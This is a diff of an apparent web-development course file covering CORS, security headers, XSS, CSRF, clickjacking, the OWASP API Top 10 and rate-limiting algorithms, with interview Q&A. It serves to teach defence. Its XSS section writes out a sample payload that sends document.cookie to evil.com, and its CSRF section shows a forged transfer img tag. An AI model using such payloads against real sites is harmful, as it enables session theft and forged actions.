+Access-Control-Allow-Methods: GET, POST, PUT, DELETE
+Access-Control-Allow-Headers: Content-Type, Authorization
+Access-Control-Max-Age: 86400  ← Cache preflight for 24 hours
+
+Step 3: Browser sends actual PUT request (if preflight succeeded)
+PUT /users/123 HTTP/1.1
+Host: api.example.com
+Origin: https://app.example.com
+Authorization: Bearer token123
+Content-Type: application/json
+
+{"name": "John"}
+
+Step 4: Server responds with data
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://app.example.com
+
+{"id": 123, "name": "John"}</div>
+
+                            <h2>CORS Headers Explained</h2>
+
+                            <h3>Access-Control-Allow-Origin</h3>
+                            <div class="code-block">Specifies which origins can access the resource
+
+// Allow specific origin
+Access-Control-Allow-Origin: https://app.example.com
+
+// Allow all origins (PUBLIC API, anyone can call)
+Access-Control-Allow-Origin: *
+
+⚠️ WARNING: Use * only for public APIs!
+Don't use * with Access-Control-Allow-Credentials: true
+
+// Node.js - Dynamic origin
+app.use((req, res, next) => {
+  const allowedOrigins = [
+    'https://app.example.com',
+    'https://app2.example.com'
+  ];
+  const origin = req.headers.origin;
+
+  if (allowedOrigins.includes(origin)) {
+    res.setHeader('Access-Control-Allow-Origin', origin);
+  }
+
+  next();
+});</div>
+
+                            <h3>Access-Control-Allow-Methods</h3>
+                            <div class="code-block">Specifies allowed HTTP methods
+
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH
+
+// Express middleware
+res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');</div>
+
+                            <h3>Access-Control-Allow-Headers</h3>
+                            <div class="code-block">Specifies allowed request headers
+
+Access-Control-Allow-Headers: Content-Type, Authorization, X-API-Key
+
+// Allow all requested headers
+const requestedHeaders = req.headers['access-control-request-headers'];
+res.setHeader('Access-Control-Allow-Headers', requestedHeaders);</div>
+
+                            <h3>Access-Control-Allow-Credentials</h3>
+                            <div class="code-block">Allow cookies and authorization headers in cross-origin requests
+
+Access-Control-Allow-Credentials: true
+
+Frontend must set credentials:
+fetch('https://api.example.com/users', {
+  credentials: 'include'  // Send cookies
+});
+
+⚠️ CANNOT use with Access-Control-Allow-Origin: *
+Must specify exact origin:
+Access-Control-Allow-Origin: https://app.example.com
+Access-Control-Allow-Credentials: true</div>
+
+                            <h3>Access-Control-Max-Age</h3>
+                            <div class="code-block">How long to cache preflight response (in seconds)
+
+Access-Control-Max-Age: 86400  // 24 hours
+
+Reduces preflight requests (performance optimization)
+Browser caches "permission" for this duration</div>
+
+                            <h2>Implementing CORS</h2>
+
+                            <h3>Node.js/Express</h3>
+                            <div class="code-block">// Using cors middleware
+const cors = require('cors');
+
+// Allow all origins (public API)
+app.use(cors());
+
+// Allow specific origins
+app.use(cors({
+  origin: 'https://app.example.com'
+}));
+
+// Allow multiple origins
+app.use(cors({
+  origin: ['https://app.example.com', 'https://admin.example.com']
+}));
+
+// Dynamic origin with credentials
+app.use(cors({
+  origin: function(origin, callback) {
+    const allowedOrigins = ['https://app.example.com'];
+    if (!origin || allowedOrigins.includes(origin)) {
+      callback(null, true);
+    } else {
+      callback(new Error('Not allowed by CORS'));
+    }
+  },
+  credentials: true,
+  methods: ['GET', 'POST', 'PUT', 'DELETE'],
+  allowedHeaders: ['Content-Type', 'Authorization']
+}));
+
+// Manual CORS
+app.use((req, res, next) => {
+  res.setHeader('Access-Control-Allow-Origin', 'https://app.example.com');
+  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
+  res.setHeader('Access-Control-Allow-Credentials', 'true');
+
+  // Handle preflight
+  if (req.method === 'OPTIONS') {
+    return res.sendStatus(204);
+  }
+
+  next();
+});</div>
+
+                            <h3>Common CORS Mistakes</h3>
+                            <div class="code-block">❌ MISTAKE 1: Allow-Origin: * with credentials
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+→ Browser rejects! Cannot combine these.
+
+✅ FIX: Specify exact origin
+Access-Control-Allow-Origin: https://app.example.com
+Access-Control-Allow-Credentials: true
+
+❌ MISTAKE 2: Not handling OPTIONS
+Server doesn't respond to OPTIONS requests
+→ Preflight fails
+→ Actual request never sent
+
+✅ FIX: Return 204 for OPTIONS
+if (req.method === 'OPTIONS') {
+  return res.sendStatus(204);
+}
+
+❌ MISTAKE 3: CORS on error responses
+Server returns 500 error without CORS headers
+→ Browser blocks error
+→ JavaScript sees generic "Network error"
+
+✅ FIX: Include CORS headers even on errors
+app.use((err, req, res, next) => {
+  res.setHeader('Access-Control-Allow-Origin', 'https://app.example.com');
+  res.status(500).json({ error: err.message });
+});</div>
+
+                            <h2>Security Headers</h2>
+
+                            <h3>Content-Security-Policy (CSP)</h3>
+                            <div class="code-block">Prevents XSS attacks by controlling resource loading
+
+Content-Security-Policy: default-src 'self';
+                          script-src 'self' https://cdn.example.com;
+                          style-src 'self' 'unsafe-inline';
+                          img-src 'self' data: https:;
+                          connect-src 'self' https://api.example.com
+
+Directives:
+- default-src: Fallback for other directives
+- script-src: Where JavaScript can load from
+- style-src: CSS sources
+- img-src: Image sources
+- connect-src: AJAX/WebSocket/fetch URLs
+- frame-ancestors: Who can embed in iframe
+
+Example values:
+'self' → Same origin
+'none' → Block all
+'unsafe-inline' → Allow inline <script> (avoid!)
+'unsafe-eval' → Allow eval() (avoid!)
+https: → Any HTTPS source
+https://cdn.example.com → Specific domain
+
+// Express
+const helmet = require('helmet');
+app.use(helmet.contentSecurityPolicy({
+  directives: {
+    defaultSrc: ["'self'"],
+    scriptSrc: ["'self'", "https://cdn.example.com"],
+    styleSrc: ["'self'", "'unsafe-inline'"],
+    imgSrc: ["'self'", "data:", "https:"],
+    connectSrc: ["'self'", "https://api.example.com"]
+  }
+}));</div>
+
+                            <h3>X-Frame-Options</h3>
+                            <div class="code-block">Prevents clickjacking by controlling iframe embedding
+
+X-Frame-Options: DENY
+→ Cannot be embedded in ANY iframe
+
+X-Frame-Options: SAMEORIGIN
+→ Can only be embedded by same origin
+
+X-Frame-Options: ALLOW-FROM https://example.com
+→ Can only be embedded by specified origin
+
+Clickjacking attack:
+Evil.com puts your site in invisible iframe
+User clicks button, actually clicking your site underneath
+→ User unknowingly performs action
+
+// Express
+app.use((req, res, next) => {
+  res.setHeader('X-Frame-Options', 'DENY');
+  next();
+});
+
+Modern alternative: CSP frame-ancestors
+Content-Security-Policy: frame-ancestors 'none';  // Same as DENY
+Content-Security-Policy: frame-ancestors 'self';  // Same as SAMEORIGIN</div>
+
+                            <h3>Strict-Transport-Security (HSTS)</h3>
+                            <div class="code-block">Forces HTTPS for all future requests
+
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+
+Parameters:
+- max-age: How long to remember (seconds)
+- includeSubDomains: Apply to all subdomains
+- preload: Include in browser's HSTS preload list
+
+How it works:
+1. User visits https://example.com
+2. Server sends HSTS header
+3. Browser remembers for max-age seconds
+4. Future attempts to visit http://example.com
+   → Browser automatically redirects to https://
+
+Prevents:
+- Protocol downgrade attacks
+- Man-in-the-middle on first visit
+
+// Express
+app.use((req, res, next) => {
+  res.setHeader(
+    'Strict-Transport-Security',
+    'max-age=31536000; includeSubDomains; preload'
+  );
+  next();
+});
+
+Note: Only works over HTTPS! HTTP requests ignore this header.</div>
+
+                            <h3>X-Content-Type-Options</h3>
+                            <div class="code-block">Prevents MIME type sniffing
+
+X-Content-Type-Options: nosniff
+
+Without this:
+- Server sends text/plain
+- Browser sees <script> tag inside
+- Browser "helpfully" executes as JavaScript!
+→ XSS attack vector
+
+With nosniff:
+- Browser respects Content-Type header strictly
+- Won't execute unless Content-Type is correct
+
+// Express
+res.setHeader('X-Content-Type-Options', 'nosniff');</div>
+
+                            <h3>X-XSS-Protection</h3>
+                            <div class="code-block">Legacy XSS filter (mostly deprecated)
+
+X-XSS-Protection: 1; mode=block
+
+Values:
+0 → Disable XSS filter
+1 → Enable filter, sanitize page
+1; mode=block → Enable filter, block page if XSS detected
+
+⚠️ Deprecated: Use Content-Security-Policy instead
+Modern browsers removed this feature
+
+// Express
+res.setHeader('X-XSS-Protection', '1; mode=block');</div>
+
+                            <h2>Common Security Threats</h2>
+
+                            <h3>XSS (Cross-Site Scripting)</h3>
+                            <div class="code-block">Attacker injects malicious JavaScript into your site
+
+Example attack:
+User input: <script>fetch('https://evil.com?cookie='+document.cookie)</script>
+Server stores this in database
+Other users load page → Script executes → Cookies stolen
+
+Prevention:
+✅ Escape HTML in user input
+✅ Use Content-Security-Policy
+✅ Set HttpOnly cookies (can't access via JS)
+✅ Validate and sanitize input
+
+// Express - Escape HTML
+const escapeHtml = (str) => {
+  return str.replace(/[&<>"']/g, (char) => {
+    const map = {
+      '&': '&amp;',
+      '<': '&lt;',
+      '>': '&gt;',
+      '"': '&quot;',
+      "'": '&#39;'
+    };
+    return map[char];
+  });
+};
+
+// React automatically escapes
+<div>{userInput}</div>  // Safe!
+<div dangerouslySetInnerHTML={{__html: userInput}} />  // Dangerous!</div>
+
+                            <h3>CSRF (Cross-Site Request Forgery)</h3>
+                            <div class="code-block">Attacker tricks user into making unwanted request
+
+Example attack:
+1. User logged into yourbank.com (has session cookie)
+2. User visits evil.com
+3. Evil.com has: <img src="https://yourbank.com/transfer?to=attacker&amount=1000">
+4. Browser automatically sends yourbank.com cookies
+5. Money transferred!
+
+Prevention:
+✅ CSRF tokens (random token per session)
+✅ SameSite cookies
+✅ Check Origin/Referer headers
+✅ Require authentication for state-changing operations
+
+// CSRF token approach
+// Server generates token, stores in session
+const csrfToken = crypto.randomBytes(32).toString('hex');
+req.session.csrfToken = csrfToken;
+res.json({ csrfToken });
+
+// Frontend includes token
+fetch('/api/transfer', {
+  method: 'POST',
+  headers: {
+    'X-CSRF-Token': csrfToken
+  },
+  body: JSON.stringify({ to: 'user', amount: 100 })
+});
+
+// Server validates
+if (req.headers['x-csrf-token'] !== req.session.csrfToken) {
+  return res.status(403).json({ error: 'Invalid CSRF token' });
+}
+
+// SameSite cookies (simpler)
+res.cookie('sessionId', sessionId, {
+  httpOnly: true,
+  secure: true,
+  sameSite: 'strict'  // Don't send cookie on cross-site requests
+});</div>
+
+                            <h3>Clickjacking</h3>
+                            <div class="code-block">Attacker overlays transparent iframe to trick clicks
+
+Example attack:
+Evil.com loads yourbank.com in invisible iframe
+Places "Win iPhone!" button over "Transfer $1000" button
+User thinks they're entering contest
+→ Actually transferring money
+
+Prevention:
+✅ X-Frame-Options: DENY
+✅ CSP frame-ancestors 'none'
+
+// Express
+res.setHeader('X-Frame-Options', 'DENY');
+res.setHeader('Content-Security-Policy', "frame-ancestors 'none'");</div>
+
+                            <h2>OWASP API Security Top 10 (2023)</h2>
+
+                            <div class="code-block">Top API security risks:
+
+1. Broken Object Level Authorization
+   → Users can access other users' resources
+   → Example: GET /api/users/123 (should validate: is user 123 YOU?)
+
+2. Broken Authentication
+   → Weak passwords, no rate limiting, credentials in URLs
+
+3. Broken Object Property Level Authorization
+   → Users can modify fields they shouldn't
+   → Example: {"role": "admin"} in user update
+
+4. Unrestricted Resource Consumption
+   → No rate limiting, large payloads, expensive operations
+   → Can cause DoS
+
+5. Broken Function Level Authorization
+   → Regular users can access admin endpoints
+   → Example: DELETE /api/users (should require admin role)
+
+6. Unrestricted Access to Sensitive Business Flows
+   → Automated abuse of legitimate functionality
+   → Example: Ticket scalping bots
+
+7. Server Side Request Forgery (SSRF)
+   → API makes requests to attacker-controlled URLs
+   → Example: {"imageUrl": "http://internal-server/secrets"}
+
+8. Security Misconfiguration
+   → Default passwords, verbose errors, unnecessary features
+   → Example: Stack traces exposed to users
+
+9. Improper Inventory Management
+   → Old API versions still active, undocumented endpoints
+   → Example: /api/v1 deprecated but still vulnerable
+
+10. Unsafe Consumption of APIs
+    → Trust third-party APIs without validation
+    → Example: Relying on external API's data sanitization</div>
+
+                            <h2>Security Best Practices</h2>
+
+                            <h3>1. Always Use HTTPS</h3>
+                            <div class="code-block">✅ Encrypt all traffic
+✅ Get free SSL from Let's Encrypt
+✅ Redirect HTTP to HTTPS
+✅ Enable HSTS
+
+❌ Never send sensitive data over HTTP</div>
+
+                            <h3>2. Input Validation and Sanitization</h3>
+                            <div class="code-block">// Validate input
+const { body, validationResult } = require('express-validator');
+
+app.post('/users',
+  body('email').isEmail(),
+  body('age').isInt({ min: 0, max: 150 }),
+  (req, res) => {
+    const errors = validationResult(req);
+    if (!errors.isEmpty()) {
+      return res.status(400).json({ errors: errors.array() });
+    }
+    // Process valid input
+  }
+);</div>
+
+                            <h3>3. Rate Limiting</h3>
+                            <div class="code-block">const rateLimit = require('express-rate-limit');
+
+const limiter = rateLimit({
+  windowMs: 15 * 60 * 1000,  // 15 minutes
+  max: 100  // 100 requests per window
+});
+
+app.use('/api/', limiter);</div>
+
+                            <h3>4. Security Audits</h3>
+                            <div class="code-block">Regular security practices:
+✅ Dependency scanning (npm audit, Snyk)
+✅ Static analysis (SonarQube, ESLint security rules)
+✅ Penetration testing
+✅ Security headers scan (securityheaders.com)
+✅ OWASP ZAP automated scanning</div>
+
+                            <h2>Summary</h2>
+                            <p>CORS and security headers protect APIs from various attacks:</p>
                             <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li>CORS preflight request flow</li>
-                                <li>Common CORS misconfigurations</li>
-                                <li>Security header examples</li>
-                                <li>OWASP API Security Top 10</li>
+                                <li><strong>CORS:</strong> Controls cross-origin requests, prevents malicious sites from accessing your API</li>
+                                <li><strong>Preflight:</strong> Browser checks permissions before complex requests (OPTIONS)</li>
+                                <li><strong>CSP:</strong> Prevents XSS by controlling resource loading</li>
+                                <li><strong>X-Frame-Options:</strong> Prevents clickjacking</li>
+                                <li><strong>HSTS:</strong> Forces HTTPS for future requests</li>
+                                <li>Always use HTTPS, validate input, rate limit, implement CSRF protection</li>
+                                <li>Follow OWASP API Security Top 10</li>
+                                <li>Regular security audits and penetration testing</li>
                             </ul>
                         `,
-                        interviews: []
+                        interviews: [
+                            {
+                                question: "What is CORS and why does the same-origin policy exist?",
+                                answer: "CORS (Cross-Origin Resource Sharing) controls how web pages from one domain can access resources from another domain. Same-Origin Policy prevents malicious websites from making unauthorized requests. Without it: You visit evil.com → evil.com's JavaScript makes request to yourbank.com → Browser automatically sends your bank cookies → evil.com could steal your data or transfer money. Origin = protocol + domain + port. CORS allows servers to selectively permit cross-origin requests via Access-Control-Allow-Origin header. Protects users from malicious websites while enabling legitimate cross-domain API calls."
+                            },
+                            {
+                                question: "What's the difference between simple and preflight CORS requests?",
+                                answer: "Simple requests: Browser sends request directly if: method is GET/HEAD/POST, only simple headers (Accept, Content-Type), Content-Type is form-urlencoded/multipart/text/plain. Server responds with Access-Control-Allow-Origin. Preflight requests: Browser sends OPTIONS first if: custom headers (Authorization), methods like PUT/DELETE, Content-Type: application/json. Browser asks permission (OPTIONS) → Server responds with allowed methods/headers → Browser sends actual request. Preflight result cached by Access-Control-Max-Age. Simple requests have less overhead but limited functionality."
+                            },
+                            {
+                                question: "What does Access-Control-Allow-Credentials do and why can't you use it with wildcard origins?",
+                                answer: "Access-Control-Allow-Credentials: true allows cross-origin requests to include cookies and authorization headers. Frontend must set credentials: 'include'. Security restriction: Cannot combine with Access-Control-Allow-Origin: *. Why: Wildcard with credentials would let ANY website access your authenticated API, including malicious sites. Must specify exact origin: Access-Control-Allow-Origin: https://app.example.com. This ensures only trusted domains can make authenticated cross-origin requests. Without this restriction, evil.com could make requests with your cookies to any API."
+                            },
+                            {
+                                question: "What is XSS and how do you prevent it?",
+                                answer: "XSS (Cross-Site Scripting): Attacker injects malicious JavaScript into your site. Example: User input '<script>steal_cookies()</script>' stored in database → other users load page → script executes → cookies stolen. Prevention: 1) Escape HTML in user input (< becomes &lt;), 2) Content-Security-Policy header to control script sources, 3) HttpOnly cookies (JavaScript can't access), 4) Validate and sanitize all input, 5) Use frameworks that auto-escape (React). Never trust user input! Modern frameworks help, but CSP is essential defense-in-depth layer."
+                            },
+                            {
+                                question: "What is CSRF and how does SameSite cookie attribute prevent it?",
+                                answer: "CSRF (Cross-Site Request Forgery): Attacker tricks user into making unwanted request. Example: User logged into bank.com → visits evil.com → evil.com has <img src='bank.com/transfer?to=attacker&amount=1000'> → Browser automatically sends bank.com cookies → money transferred! SameSite cookie attribute prevents this: SameSite=Strict → cookie NEVER sent on cross-site requests. SameSite=Lax → cookie sent on top-level navigation (clicking link) but not from evil.com's <img> or fetch(). Makes traditional CSRF attacks impossible. Alternative defenses: CSRF tokens, check Origin/Referer headers."
+                            },
+                            {
+                                question: "What does the Strict-Transport-Security (HSTS) header do?",
+                                answer: "HSTS forces HTTPS for all future requests to your domain. Header: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload. How it works: User visits https://example.com → server sends HSTS header → browser remembers for max-age seconds (1 year) → future attempts to visit http://example.com automatically redirected to https:// BEFORE request sent. Prevents: protocol downgrade attacks, man-in-the-middle on first visit, users typing http:// by accident. includeSubDomains applies to all subdomains. preload includes in browser's hardcoded HSTS list. Only works over HTTPS (HTTP requests ignore it)."
+                            }
+                        ]
                     }
                 ]
             },
@@ -14987,182 +18664,2793 @@ validator.isEmail(email);  // Tested, safe regex</div>
                         title: 'Rate Limiting Strategies',
                         duration: '50 min',
                         content: `
-                            <h2>OUTLINE: Rate Limiting</h2>
+                            <h2>Why Rate Limiting?</h2>
+                            <p>Rate limiting controls how many requests a client can make to your API in a given time period. It's essential for protecting your infrastructure and ensuring fair access.</p>
 
-                            <h3>Topics to Cover:</h3>
-                            <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li><strong>Why Rate Limiting</strong>
-                                    - Prevent abuse and DoS
-                                    - Fair resource allocation
-                                    - Cost control
-                                    - Service quality
-                                </li>
-                                <li><strong>Rate Limiting Algorithms</strong>
-                                    - Token Bucket (smooth rate, allows bursts)
-                                    - Leaky Bucket (constant rate)
-                                    - Fixed Window (simple, boundary issues)
-                                    - Sliding Window (accurate, more complex)
-                                    - Sliding Window Log (most accurate, expensive)
-                                </li>
-                                <li><strong>Rate Limit Dimensions</strong>
-                                    - Per IP address
-                                    - Per user/API key
-                                    - Per endpoint
-                                    - Global limits
-                                </li>
-                                <li><strong>Rate Limit Headers</strong>
-                                    - X-RateLimit-Limit
-                                    - X-RateLimit-Remaining
-                                    - X-RateLimit-Reset
-                                    - Retry-After (429 response)
-                                </li>
-                                <li><strong>Implementation</strong>
-                                    - Redis for distributed rate limiting
-                                    - In-memory for single server
-                                    - API gateway rate limiting
-                                </li>
-                            </ul>
+                            <h3>Reasons for Rate Limiting</h3>
+                            <div class="code-block">1. Prevent Abuse and DoS Attacks
+Attacker sends millions of requests
+→ Server overwhelmed
+→ Legitimate users can't access service
 
-                            <h3>Examples to Include:</h3>
+Rate limiting blocks excessive requests from single source
+
+2. Fair Resource Allocation
+Without limits:
+- One user makes 1 million requests
+- Other users get slow responses
+→ Poor experience for everyone
+
+With limits:
+- Each user gets fair share (e.g., 1000/hour)
+- Consistent performance for all
+
+3. Cost Control
+Cloud services charge per request/compute time
+Unlimited requests = unlimited costs
+Example: AWS Lambda, API Gateway charged per call
+
+4. Service Quality
+Database has limited connections (e.g., 100)
+Without limits: First 100 users succeed, rest fail
+With limits: Smooth traffic, better experience
+
+5. Prevent Brute Force Attacks
+Login endpoint without limits:
+→ Attacker tries 1 million passwords
+With rate limiting (e.g., 5 attempts per minute):
+→ Brute force impractical</div>
+
+                            <h2>Rate Limiting Algorithms</h2>
+
+                            <h3>1. Token Bucket</h3>
+                            <div class="code-block">Concept: Bucket holds tokens, requests consume tokens
+
+Properties:
+- Bucket capacity: Maximum tokens (allows bursts)
+- Refill rate: Tokens added per time unit
+- Request cost: Tokens consumed per request
+
+Example: 100 token capacity, refill 10/second
+
+Bucket: [100 tokens] ← Starts full
+Request: -1 token
+Refill: +10 tokens/second
+
+Time 0s: 100 tokens → 10 requests (90 tokens left)
+Time 1s: 90 + 10 = 100 tokens (refilled)
+Time 5s: 100 tokens → Can burst 100 requests immediately!
+
+Visualization:
+    ┌─────────────┐
+    │   Tokens    │ ← Refill at constant rate
+    │ ████████░░░ │ (10/second)
+    │  85 / 100   │
+    └─────────────┘
+         ↓
+    Each request
+    takes 1 token
+
+Pros:
+✅ Allows bursts (good for spiky traffic)
+✅ Smooth rate over time
+✅ Simple to implement
+
+Cons:
+❌ Can allow large burst if bucket full
+
+Use cases:
+- API with occasional traffic spikes
+- User-facing APIs (tolerate bursts)
+- AWS API Gateway uses this</div>
+
+                            <h3>Token Bucket Implementation</h3>
+                            <div class="code-block">// Simple in-memory token bucket
+class TokenBucket {
+  constructor(capacity, refillRate) {
+    this.capacity = capacity;
+    this.refillRate = refillRate;  // tokens per second
+    this.tokens = capacity;
+    this.lastRefill = Date.now();
+  }
+
+  refill() {
+    const now = Date.now();
+    const elapsed = (now - this.lastRefill) / 1000;  // seconds
+    const tokensToAdd = elapsed * this.refillRate;
+
+    this.tokens = Math.min(this.capacity, this.tokens + tokensToAdd);
+    this.lastRefill = now;
+  }
+
+  tryConsume(tokens = 1) {
+    this.refill();
+
+    if (this.tokens >= tokens) {
+      this.tokens -= tokens;
+      return true;  // Request allowed
+    }
+
+    return false;  // Rate limited
+  }
+}
+
+// Usage
+const bucket = new TokenBucket(100, 10);  // 100 capacity, 10/sec refill
+
+app.use((req, res, next) => {
+  const userId = req.user.id;
+  const bucket = getUserBucket(userId);
+
+  if (bucket.tryConsume(1)) {
+    next();  // Allow request
+  } else {
+    res.status(429).json({
+      error: 'Too many requests',
+      retryAfter: Math.ceil((1 - bucket.tokens) / bucket.refillRate)
+    });
+  }
+});</div>
+
+                            <h3>2. Leaky Bucket</h3>
+                            <div class="code-block">Concept: Requests enter bucket, leak out at constant rate
+
+Properties:
+- Bucket size: Maximum queued requests
+- Leak rate: Requests processed per time unit
+- Incoming requests fill the bucket
+
+Example: 10 requests/second leak rate
+
+Incoming: ┌──┬──┬──┬──┐
+Requests  │  │  │  │  │  ← Arrive at any rate
+          └──┴──┴──┴──┘
+               ↓
+          ┌──────────┐
+   Bucket │ ████░░░░ │  ← Fills if incoming > leak rate
+          │  6 / 10  │
+          └──────────┘
+               ↓ Leak at constant 10/sec
+          ┌──┬──┬──┐
+Processed │  │  │  │    ← Always constant rate
+          └──┴──┴──┘
+
+When bucket full:
+- New requests rejected (overflow)
+- Returns 429 Too Many Requests
+
+Pros:
+✅ Constant output rate (predictable load)
+✅ Smooths traffic spikes
+
+Cons:
+❌ No bursts allowed (even if system idle)
+❌ Queuing delay
+
+Use cases:
+- Upstream rate limits (third-party API)
+- Network traffic shaping
+- Message queues</div>
+
+                            <h3>3. Fixed Window</h3>
+                            <div class="code-block">Concept: Count requests in fixed time windows
+
+Example: 100 requests per hour
+
+Window 1: [00:00 - 01:00] → Count: 95/100
+Window 2: [01:00 - 02:00] → Count: 0/100 (resets!)
+
+Implementation:
+{
+  "user123:2024-01-15-14": 45,  // 45 requests in hour 14
+  "user123:2024-01-15-15": 12   // 12 requests in hour 15
+}
+
+Pros:
+✅ Simple to implement
+✅ Memory efficient (one counter per window)
+✅ Fast (single Redis INCR)
+
+Cons:
+❌ Boundary issue (burst at window edges)
+
+Example boundary problem:
+00:59:30 → 50 requests (allowed)
+01:00:00 → Counter resets!
+01:00:01 → 50 requests (allowed)
+→ 100 requests in 31 seconds! (should be limited)
+
+Use cases:
+- Simple rate limiting (acceptable burst at boundaries)
+- Analytics (count requests per hour)
+- When precision not critical</div>
+
+                            <h3>Fixed Window Implementation</h3>
+                            <div class="code-block">// Redis-based fixed window
+async function fixedWindowRateLimit(userId, limit, windowSeconds) {
+  const now = Date.now();
+  const window = Math.floor(now / (windowSeconds * 1000));
+  const key = \`ratelimit:\${userId}:\${window}\`;
+
+  // Increment counter
+  const count = await redis.incr(key);
+
+  // Set expiration on first request of window
+  if (count === 1) {
+    await redis.expire(key, windowSeconds);
+  }
+
+  if (count > limit) {
+    return {
+      allowed: false,
+      limit: limit,
+      remaining: 0,
+      resetAt: (window + 1) * windowSeconds * 1000
+    };
+  }
+
+  return {
+    allowed: true,
+    limit: limit,
+    remaining: limit - count,
+    resetAt: (window + 1) * windowSeconds * 1000
+  };
+}
+
+// Usage
+app.use(async (req, res, next) => {
+  const result = await fixedWindowRateLimit(req.user.id, 100, 3600);
+
+  res.set('X-RateLimit-Limit', result.limit);
+  res.set('X-RateLimit-Remaining', result.remaining);
+  res.set('X-RateLimit-Reset', result.resetAt);
+
+  if (!result.allowed) {
+    return res.status(429).json({ error: 'Rate limit exceeded' });
+  }
+
+  next();
+});</div>
+
+                            <h3>4. Sliding Window</h3>
+                            <div class="code-block">Concept: Smooth fixed window with weighted calculation
+
+Combines current and previous window to estimate rate
+
+Example: 100 requests per hour, checking at 00:30
+
+Current window [00:00-01:00]: 40 requests so far
+Previous window [23:00-00:00]: 80 requests (completed)
+
+Position in current window: 30 minutes = 50%
+Weight from previous window: 50%
+
+Estimated requests in last hour:
+= (previous * weight) + current
+= (80 * 0.5) + 40
+= 40 + 40
+= 80 requests
+
+If 80 < 100 → Allow request
+If 80 >= 100 → Deny request
+
+Visualization:
+Previous      Current
+[────────] [────────]
+   80         40
+    └─50%  50%─┘
+        └─┬─┘
+       Check point
+       at 00:30
+
+Pros:
+✅ Smoother than fixed window
+✅ No boundary problem
+✅ More accurate than fixed window
+
+Cons:
+❌ More complex than fixed window
+❌ Approximate (not exact)
+
+Use cases:
+- Production APIs (good balance)
+- GitHub uses this (5000/hour for authenticated)</div>
+
+                            <h3>Sliding Window Implementation</h3>
+                            <div class="code-block">// Redis-based sliding window
+async function slidingWindowRateLimit(userId, limit, windowSeconds) {
+  const now = Date.now();
+  const currentWindow = Math.floor(now / (windowSeconds * 1000));
+  const previousWindow = currentWindow - 1;
+
+  const currentKey = \`ratelimit:\${userId}:\${currentWindow}\`;
+  const previousKey = \`ratelimit:\${userId}:\${previousWindow}\`;
+
+  // Get counts
+  const [currentCount, previousCount] = await Promise.all([
+    redis.get(currentKey).then(v => parseInt(v) || 0),
+    redis.get(previousKey).then(v => parseInt(v) || 0)
+  ]);
+
+  // Calculate position in current window (0.0 to 1.0)
+  const windowStart = currentWindow * windowSeconds * 1000;
+  const percentageIntoWindow = (now - windowStart) / (windowSeconds * 1000);
+
+  // Weighted count from previous window
+  const estimatedCount =
+    Math.floor(previousCount * (1 - percentageIntoWindow)) + currentCount;
+
+  if (estimatedCount >= limit) {
+    return { allowed: false, limit, remaining: 0 };
+  }
+
+  // Increment current window
+  await redis.incr(currentKey);
+  await redis.expire(currentKey, windowSeconds * 2);
+
+  return {
+    allowed: true,
+    limit,
+    remaining: limit - estimatedCount - 1
+  };
+}</div>
+
+                            <h3>5. Sliding Window Log</h3>
+                            <div class="code-block">Concept: Store timestamp of each request, count in time window
+
+Example: 100 requests per hour
+
+Store: [09:45:12, 09:45:15, 09:45:20, ..., 10:23:45]
+
+To check at 10:45:30:
+1. Remove timestamps older than 1 hour ago (< 09:45:30)
+2. Count remaining timestamps
+3. If count < 100 → Allow
+
+Pros:
+✅ Most accurate (exact count)
+✅ No boundary issues
+✅ Can track per-request metadata
+
+Cons:
+❌ Memory expensive (store every timestamp)
+❌ Slow (clean old entries every check)
+
+Example memory usage:
+100 req/hour * 1M users * 8 bytes = 800 MB just for timestamps!
+
+Use cases:
+- Premium tier with strict guarantees
+- When exact fairness required
+- Low traffic endpoints</div>
+
+                            <h3>Algorithm Comparison</h3>
+                            <table>
+                                <thead>
+                                    <tr>
+                                        <th>Algorithm</th>
+                                        <th>Accuracy</th>
+                                        <th>Memory</th>
+                                        <th>Allows Bursts</th>
+                                        <th>Complexity</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td><strong>Token Bucket</strong></td>
+                                        <td>Good</td>
+                                        <td>Low</td>
+                                        <td>Yes</td>
+                                        <td>Low</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Leaky Bucket</strong></td>
+                                        <td>Good</td>
+                                        <td>Low</td>
+                                        <td>No</td>
+                                        <td>Low</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Fixed Window</strong></td>
+                                        <td>Approximate</td>
+                                        <td>Very Low</td>
+                                        <td>Edge bursts</td>
+                                        <td>Very Low</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Sliding Window</strong></td>
+                                        <td>Good</td>
+                                        <td>Low</td>
+                                        <td>Controlled</td>
+                                        <td>Medium</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Sliding Window Log</strong></td>
+                                        <td>Exact</td>
+                                        <td>High</td>
+                                        <td>Controlled</td>
+                                        <td>High</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+
+                            <h2>Rate Limit Dimensions</h2>
+
+                            <h3>Per IP Address</h3>
+                            <div class="code-block">Limit requests from single IP address
+
+Use case: Unauthenticated endpoints (public API)
+
+// Express middleware
+const ipLimits = new Map();
+
+app.use((req, res, next) => {
+  const ip = req.ip;
+  const limit = checkRateLimit(ip, 100, 3600);  // 100/hour
+
+  if (!limit.allowed) {
+    return res.status(429).json({ error: 'Too many requests' });
+  }
+
+  next();
+});
+
+Problem: Shared IPs (corporate network, NAT)
+- One user's abuse blocks entire company
+- False positives common
+
+Solution: Combine with other dimensions (user agent, cookies)</div>
+
+                            <h3>Per User/API Key</h3>
+                            <div class="code-block">Limit requests per authenticated user
+
+Use case: Most authenticated APIs
+
+app.use(authenticateUser);
+
+app.use(async (req, res, next) => {
+  const userId = req.user.id;
+  const limit = await checkRateLimit(userId, 1000, 3600);  // 1000/hour
+
+  if (!limit.allowed) {
+    return res.status(429).json({
+      error: 'Rate limit exceeded',
+      limit: 1000,
+      remaining: 0
+    });
+  }
+
+  next();
+});
+
+Benefits:
